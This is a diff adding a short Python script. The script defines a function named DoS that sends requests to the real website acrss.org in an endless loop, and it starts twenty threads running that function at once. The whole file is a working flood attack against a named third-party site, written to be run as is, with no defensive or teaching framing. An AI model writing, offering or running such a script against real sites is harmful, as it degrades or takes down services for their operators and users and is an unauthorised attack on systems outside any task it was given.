@@ -1,0 +1,51 @@
+import requests
+import threading
+
+def DoS():
+    x = 1
+    while True:
+        print(requests.get('https://www.acrss.org/'))
+        print(x)
+        x += 1
+
+haha0 = threading.Thread(target=DoS)
+haha1 = threading.Thread(target=DoS)
+haha2 = threading.Thread(target=DoS)
+haha3 = threading.Thread(target=DoS)
+haha4 = threading.Thread(target=DoS)
+haha5 = threading.Thread(target=DoS)
+haha6 = threading.Thread(target=DoS)
+haha7 = threading.Thread(target=DoS)
+haha8 = threading.Thread(target=DoS)
+haha9 = threading.Thread(target=DoS)
+hahaA = threading.Thread(target=DoS)
+hahaB = threading.Thread(target=DoS)
+hahaC = threading.Thread(target=DoS)
+hahaD = threading.Thread(target=DoS)
+hahaE = threading.Thread(target=DoS)
+hahaF = threading.Thread(target=DoS)
+hahaG = threading.Thread(target=DoS)
+hahaH = threading.Thread(target=DoS)
+hahaI = threading.Thread(target=DoS)
+hahaJ = threading.Thread(target=DoS)
+
+haha0.start()
+haha1.start()
+haha2.start()
+haha3.start()
+haha4.start()
+haha5.start()
+haha6.start()
+haha7.start()
+haha8.start()
+haha9.start()
+hahaA.start()
+hahaB.start()
+hahaC.start()
+hahaD.start()
+hahaE.start()
+hahaF.start()
+hahaG.start()
+hahaH.start()
+hahaI.start()
+hahaJ.start()
